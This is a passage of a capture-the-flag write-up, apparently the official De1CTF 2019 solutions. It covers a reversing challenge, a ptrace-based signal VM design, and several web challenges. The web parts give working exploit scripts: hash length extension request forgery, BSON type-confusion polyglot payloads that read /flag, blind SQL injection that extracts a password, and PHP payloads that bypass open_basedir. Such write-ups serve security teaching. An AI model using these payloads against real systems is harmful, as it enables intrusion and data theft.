&lt;&lt; <span class="string">"GG..."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">			Sleep(<span class="number">100000000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((szExp[i] != <span class="string">'-'</span>) &amp;&amp; (szExp[i] != <span class="string">'*'</span>) &amp;&amp; (szExp[i] != <span class="string">'('</span>)</span><br><span class="line">			&amp;&amp; (szExp[i] != <span class="string">')'</span>) &amp;&amp; (szExp[i] != <span class="string">'/'</span>)) &#123;</span><br><span class="line">			_exit(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//只能有5个数字和1个小写字母，就是'e'</span></span><br><span class="line">	<span class="keyword">if</span> ((count_num != <span class="number">5</span>) || (count_alpha != <span class="number">1</span>)) &#123;</span><br><span class="line">		_exit(count_num);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ((szExp[<span class="number">1</span>] &lt; <span class="string">'a'</span>) || (szExp[<span class="number">1</span>] &gt; <span class="string">'z'</span>)) &#123;</span><br><span class="line">			Sleep(<span class="number">10000000</span>);</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You failed!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (result - <span class="number">24</span> &lt; <span class="number">0.0000001</span> || result - <span class="number">24</span> &gt; <span class="number">0.0000001</span>) &#123;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You finally get sth."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Maybe you missed a code branch..."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"MD5 is 293316bfd246fa84e566d7999df88e79,You should check it!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"de1ctf&#123;"</span> &lt;&lt; vm[<span class="string">"name"</span>].as&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;() &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>长度为11,5个数字，1个小写字母(只能是e)</p>
<p>因为只能使用乘除减，5551是比较容易想到的，但也不排除可能有其他解，给出了md5</p>
<p>根据浮点数的计算<code>(result - 24 &lt; 0.0000001 || result - 24 &gt; 0.0000001)</code>很容易反推是在计算 24点，最后输入的name就是flag</p>
<h2 id="Signal-vm-Signal-vm-Δ"><a href="#Signal-vm-Signal-vm-Δ" class="headerlink" title="Signal vm + Signal vm Δ"></a>Signal vm + Signal vm Δ</h2><p>通过异常进入各种handler，从而实现虚拟机。</p>
<p>参考了强网杯2018的题目 obf ，基于这道题的基础上魔改了一下。</p>
<p>我找不到官方wp了 ，所以只好把原题贴一下，感兴趣的可以看看。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>先fork出一个子进程，父进程会调试子进程，子进程会进入各种由异常组成的bytecode，父进程根据异常的类型进行各种虚拟机操作。</p>
<p>Signal VM 和Signal VM Δ 不同的一点在于，第一题直接对父进程本身的数据进行操作，子进程只是起到传达code的作用</p>
<p>第二题使用PTRACE_PEEKTEXT 和PTRACE_POKETEXT，直接修改子进程的内存。</p>
<p>这样在我们调试父进程的时候，在第一题中可以直接监视VM寄存器和VM的内存，从而帮助我们理解指令。</p>
<p>而在第二题中，由于子进程已经被父进程调试了，我们无法附加上去，无法查看子进程的内存，只能查看父进程调试获取的数据，加大了理解指令的难度，分析解析指令这一部分更为重要。</p>
<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>指令大致分为三部分：opcode， 操作数类型，操作数</p>
<p>除了int 3断点，还添加了三种不同的异常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">signal    | machine code | handler</span><br><span class="line">-------------------------------------------</span><br><span class="line">SIGILL    | 06           | mov, lea ...</span><br><span class="line">SIGTRAP   | CC           | add, sub, mul div ...</span><br><span class="line">SIGSEGV   | 00 00        | jcc</span><br><span class="line">SIGFPE    | 30 C0 F6 F8  | cmp</span><br></pre></td></tr></table></figure>
<p>opcode之后有一个字节用来标识操作数的类型（除了jcc）</p>
<p>高 4 bit代表第一个操作数，低 4 bit代表第二个操作数，其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0  register</span><br><span class="line">1  immediate</span><br><span class="line">2  address</span><br></pre></td></tr></table></figure>
<p>地址只能是由寄存器指向，第一个操作数不能为立即数，立即数位32位</p>
<p>在这之后是两个操作数，应当根据操作数类型进行匹配。寄存器占一个字节，立即数占四个字节。</p>
<h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><p>两道题的算法都不算难。</p>
<p>第一题为hill cipher</p>
<p>第二题可以参考<a href="https://projecteuler.net/problem=67，我们需要求出最大和的路径，路径中包含flag。" target="_blank" rel="noopener">https://projecteuler.net/problem=67，我们需要求出最大和的路径，路径中包含flag。</a></p>
<p>可以动态规划从下往上叠加，取相邻两个中的较大的一个，具体参考解题脚本。</p>
<p>构造数据的时候保证每行与最大值相邻的不会相等，这样排除了多解的情况。</p>
<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><p>vm1.c和vm2.c是两道题的源代码，由于我比较菜，写的也比较仓促，代码质量可能不高。。。</p>
<p>hill.c和triangle.c是算法的源码</p>
<p>assembly1.txt和assembly2.txt是vm的汇编代码，我直接从x86汇编翻译过来的。。。</p>
<p>simulate1.py和simulate2.py是解析bytecode并模拟执行，然后把bytecode写进bytecode1 和bytecode2。</p>
<p>solve1.py和solve2.py是参考脚本。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>虚拟机结构还有很多不足的地方。可以触发的异常比较少，因此指令不能设置太多。没有区分有符号与无符号数，总的来说还是太菜了。</p>
<p>第二题其实是第一天晚上临时起意改出来的，一开始没准备出两道题。最早不知道可以有修改子进程的方法，后来查了一些资料才了解到的，然后爆肝一晚改出了第二道题。原本第二题只有这一个算法的。。。如果直接放第二题可能效果会更好一点。。。</p>
<p>有任何问题可以tg联系我 <a href="https://t.me/Apeng7364" target="_blank" rel="noopener">@Apeng7364</a></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h2><h4 id="预期解法"><a href="#预期解法" class="headerlink" title="预期解法:"></a>预期解法:</h4><p>哈希长度拓展攻击+CVE-2019-9948(urllib)</p>
<hr>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解:"></a>题解:</h4><p>代码很简单,主要是有根据传入的action参数判断,有两种模式,一种是请求Param参数的地址,并把结果写入<code>result.txt</code>,另一种是读取<code>result.txt</code>的内容,两种方式都需要<code>sign</code>值校验.并且<code>sign</code>值是通过拼接参数哈希加密,所以可以使用哈希长度拓展攻击.题目给出了<code>scan</code>模式的<code>sign</code>值.</p>
<ol>
<li><p>获取<code>scan</code>模式的<code>sign</code>值.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /geneSign?param=local-file:flag.txt HTTP/1.1</span><br><span class="line">Host: 139.180.128.86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.15.8</span><br><span class="line">Content-Length: 32</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">51796b52dd6e1108c89b7d5277d3ae0a</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>hashpump</code>生成新的<code>sign</code>值.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump</span><br><span class="line">Input Signature: 51796b52dd6e1108c89b7d5277d3ae0a</span><br><span class="line">Input Data: local-file:flag.txtscan</span><br><span class="line">Input Key Length: 16</span><br><span class="line">Input Data to Add: read</span><br><span class="line">eafd6ccd634ec29886babc843f1d8b86                                                                                        </span><br><span class="line">local-file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>
</li>
<li><p>把新生成的参数中<code>\x</code>替换成<code>%</code>,然后提交,即可获取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /De1ta?param=local-file:flag.txt HTTP/1.1</span><br><span class="line">Host: 139.180.128.86</span><br><span class="line">Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read;sign=eafd6ccd634ec29886babc843f1d8b86</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.15.8</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 65</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;de1ctf&#123;27782fcffbb7d00309a93bc49b74ca26&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>由于出题时候的粗心,导致题目产生非预期,太菜了,Orz</p>
<h2 id="9calc"><a href="#9calc" class="headerlink" title="9calc"></a>9calc</h2><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h4><p>Same to v1 and v2.</p>
<h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h4><p>The second task is to bypass RegExp <code>/^[0-9a-z\[\]\+\-\*\/ \t]+$/</code>.</p>
<p>Nestjs is a Nodejs Web Framework which is very similar to Spring, and it’s written by TypeScript. However, it’s <strong>NOT</strong> Spring. TypeScript is a strongly-typed language, but it’s designed for transcompiles to JavaScript so all type definitions will be removed in runtime. We can just ignore <code>expression: string</code> type hinting and pass an object to <code>expression</code>. This time, <code>object.toString() === &#39;[object Object]&#39;</code>.</p>
<p>But we have no way to let <code>object.toString()</code> become a useful runnable code ─ if frontend and backends communicate by JSON, it’s true. I believe that everyone has used MongoDB. Nodejs can pass a JavaScript function to MongoDB, which is not defined in the JSON standard. So they introduce BSON as their data interchange format. This challenge also used BSON. Luckily, we can simulate our object to a BSON object in JavaScript.</p>
<p>Let’s read <code>mongodb/js-bson</code>‘s serializer, we can know it detects the object’s type by <code>Object[_bsontype]</code> instead of <code>instanceof</code>.</p>
<p><a href="https://github.com/mongodb/js-bson/blob/master/lib/parser/serializer.js#L756" target="_blank" rel="noopener">https://github.com/mongodb/js-bson/blob/master/lib/parser/serializer.js#L756</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value[<span class="string">'_bsontype'</span>] === <span class="string">'Binary'</span>) &#123;</span><br><span class="line">  index = serializeBinary(buffer, key, value, index, <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value[<span class="string">'_bsontype'</span>] === <span class="string">'Symbol'</span>) &#123;</span><br><span class="line">  index = serializeSymbol(buffer, key, value, index, <span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value[<span class="string">'_bsontype'</span>] === <span class="string">'DBRef'</span>) &#123;</span><br></pre></td></tr></table></figure>
<p>After searching, I found that <code>Symbol</code> is the best type to emulate an object as a string. I checked most of the BSON deserializers and <code>Symbol.toString()</code> always returns the value of the symbol.</p>
<p>So let’s build a Symbol like this:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"expression"</span>:&#123;<span class="attr">"value"</span>:<span class="string">"1+1"</span>,<span class="attr">"_bsontype"</span>:<span class="string">"Symbol"</span>&#125;, <span class="attr">"isVip"</span>: <span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h4><p>Build 3 polyglots in 3 languages to get flag.</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'http://45.77.242.16/calculate'</span></span><br><span class="line"><span class="keyword">const</span> symbols = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_'</span>.split(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payloads = [</span><br><span class="line">	<span class="comment">// Nodejs</span></span><br><span class="line">	<span class="string">`1 + 0//5 or '''\n//?&gt;\nrequire('fs').readFileSync('/flag','utf-8')[&#123;index&#125;] == '&#123;symbol&#125;' ? 1 : 2;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Python</span></span><br><span class="line">	<span class="string">`(open('/flag').read()[&#123;index&#125;] == '&#123;symbol&#125;') + (str(1//5) == 0) or 2 or ''' #\n))//?&gt;\nfunction open()&#123;return &#123;read:()=&gt;'&#123;flag&#125;'&#125;&#125;function str()&#123;return 0&#125;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line">	<span class="comment">// PHP</span></span><br><span class="line">	<span class="string">`len('1') + 0//5 or '''\n//?&gt;\n1;function len()&#123;return 1&#125;/*&lt;?php\nfunction len($a)&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; file_get_contents('/flag')[&#123;index&#125;] == '&#123;symbol&#125;' ? "1" : "2"]);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> rets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> checkAnswer = <span class="function">(<span class="params">value</span>) =&gt;</span> axios.post(url, &#123;</span><br><span class="line">	expression: &#123;</span><br><span class="line">		value,</span><br><span class="line">		_bsontype: <span class="string">"Symbol"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	isVip: <span class="literal">true</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">p</span> =&gt;</span> p.data.ret === <span class="string">'1'</span>).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; payloads.length; j++) &#123;</span><br><span class="line">		<span class="keyword">const</span> payload = payloads[j]</span><br><span class="line">		<span class="keyword">let</span> flag = <span class="string">''</span></span><br><span class="line">		<span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line">				<span class="keyword">const</span> ret = <span class="keyword">await</span> checkAnswer(payload.replace(<span class="regexp">/\&#123;flag\&#125;/g</span>, flag + symbols[i]).replace(<span class="regexp">/\&#123;symbol\&#125;/g</span>, symbols[i]).replace(<span class="regexp">/\&#123;index\&#125;/g</span>, index))</span><br><span class="line">				<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">					flag += symbols[i]</span><br><span class="line">					<span class="built_in">console</span>.log(symbols[i])</span><br><span class="line">					i = <span class="number">0</span></span><br><span class="line">					index++</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		rets.push(flag)</span><br><span class="line">		<span class="built_in">console</span>.log(rets)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn().then(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(rets.join(<span class="string">''</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h4><p>In this challenge, the BSON part was inspired by the <code>996Game</code> of <code>*CTF2019</code>. The code of <code>996game</code> is:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GameServer.loadPlayer = <span class="function"><span class="keyword">function</span>(<span class="params">socket,id</span>)</span>&#123;</span><br><span class="line">  GameServer.server.db.collection(<span class="string">'players'</span>).findOne(&#123;<span class="attr">_id</span>: <span class="keyword">new</span> ObjectId(id)&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,doc</span>)</span>&#123;</span><br></pre></td></tr></table></figure>
<p>I built <code>{ toHexString: &#39;aaa&#39;, length: 0, id: {length: 12} }</code> to bypass the validation of <code>ObjectId</code> because MongoDB Driver used old version <code>js-bson</code>. This maybe useful in MongoDB injection.</p>
<h2 id="Giftbox"><a href="#Giftbox" class="headerlink" title="Giftbox"></a>Giftbox</h2><p>以前 1.0 版本 writeup：</p>
<p><a href="https://github.com/impakho/ciscn2019_giftbox" target="_blank" rel="noopener">impakho/ciscn2019_giftbox</a></p>
<p>本题是 2.0 版本。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/1.png" alt="1"></p>
<p>题目页面类似一个网页沙盒。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/2.png" alt="2"></p>
<p>在源代码 <code>main.js</code> 里找到一个提示，提供了 <code>otp</code> 的 <code>python库</code> 和 <code>totp</code> 的参数，方便写脚本。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/3.png" alt="3"></p>
<p>同样是 <code>main.js</code> 里，可以找到用来生成 <code>totp</code> 的 <code>key</code> 。</p>
<p>出题人注：服务端时间与客户端时间相差大于 <code>15秒</code> ，需要先计算正确的 <code>totp</code> 才能调用 <code>shell.php</code> 。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/4.png" alt="4"></p>
<p>查看 <code>usage.md</code> 可以看到命令用法， <code>login</code> 存在注入，没有过滤，用户名和密码长度限制 <code>100</code>。</p>
<p>爆破密码脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line">import pyotp</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/shell.php?a=%s&amp;totp=%s&apos;</span><br><span class="line">totp = pyotp.TOTP(&quot;GAXG24JTMZXGKZBU&quot;, digits=8, interval=5)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">length = 0</span><br><span class="line">left = 0x0</span><br><span class="line">right = 0xff</span><br><span class="line">while True:</span><br><span class="line">    mid = int((right - left) / 2 + left)</span><br><span class="line">    if mid == left:</span><br><span class="line">        length = mid</span><br><span class="line">        break</span><br><span class="line">    username = &quot;&apos;/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))&gt;=%d,1,0)#&quot; % mid</span><br><span class="line">    password = &quot;b&quot;</span><br><span class="line">    payload = &apos;login %s %s&apos; % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    res = s.get(payload).text</span><br><span class="line">    if &apos;incorrect&apos; in res:</span><br><span class="line">        left = mid</span><br><span class="line">    else:</span><br><span class="line">        right = mid</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line">real_password = &apos;&apos;</span><br><span class="line">for i in range(1, length+1):</span><br><span class="line">    left = 0x20</span><br><span class="line">    right = 0x7e</span><br><span class="line">    while True:</span><br><span class="line">        mid = int((right - left) / 2 + left)</span><br><span class="line">        if mid == left:</span><br><span class="line">            real_password += chr(mid)</span><br><span class="line">            break</span><br><span class="line">        username = &quot;&apos;/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))&gt;=%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        password = &quot;b&quot;</span><br><span class="line">        payload = &apos;login %s %s&apos; % (username, password)</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = url % (payload, totp.now())</span><br><span class="line">        res = s.get(payload).text</span><br><span class="line">        if &apos;incorrect&apos; in res:</span><br><span class="line">            left = mid</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">    print(real_password)</span><br><span class="line">    if len(real_password) &lt; i:</span><br><span class="line">        print(&apos;No.%d char not in range&apos; % i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/5.png" alt="5"></p>
<p>得到密码：<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/6.png" alt="6"></p>
<p>密码里提示有个隐藏命令 <code>sh0w_hiiintttt_23333</code> ，可以得到提示 <code>eval</code> 在 <code>launch</code> 的时候被调用。</p>
<p><code>launch</code> 前需要先用 <code>targeting</code> 设置，不过对输入有限制，这里可以 <code>fuzz</code> 一下，得知 <code>code</code> 限制 <code>a-zA-Z0-9</code> ， <code>position</code> 限制 <code>a-zA-Z0-9})$({_+-,.</code> ，而且两者的长度也有限制。</p>
<p>这里需要用 <code>php可变变量</code> 构造和拼接 <code>payload</code> 。</p>
<p>构造用来 <code>getflag</code> 的 <code>payload</code> ，绕过 <code>open_basedir</code> 的限制，写个脚本就能 <code>getflag</code> 。</p>
<p><code>getflag</code> 脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line">import pyotp</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/shell.php?a=%s&amp;totp=%s&apos;</span><br><span class="line">totp = pyotp.TOTP(&quot;GAXG24JTMZXGKZBU&quot;, digits=8, interval=5)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">def login(password):</span><br><span class="line">    username = &apos;admin&apos;</span><br><span class="line">    payload = &apos;login %s %s&apos; % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line">def destruct():</span><br><span class="line">    payload = &apos;destruct&apos;</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line">def targeting(code, position):</span><br><span class="line">    payload = &apos;targeting %s %s&apos; % (code, position)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line">def launch():</span><br><span class="line">    payload = &apos;launch&apos;</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    return s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(&apos;hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&apos;)</span><br><span class="line">destruct()</span><br><span class="line">targeting(&apos;a&apos;,&apos;chr&apos;)</span><br><span class="line">targeting(&apos;b&apos;,&apos;&#123;$a(46)&#125;&apos;)</span><br><span class="line">targeting(&apos;c&apos;,&apos;&#123;$b&#125;&#123;$b&#125;&apos;)</span><br><span class="line">targeting(&apos;d&apos;,&apos;&#123;$a(47)&#125;&apos;)</span><br><span class="line">targeting(&apos;e&apos;,&apos;js&apos;)</span><br><span class="line">targeting(&apos;f&apos;,&apos;open_basedir&apos;)</span><br><span 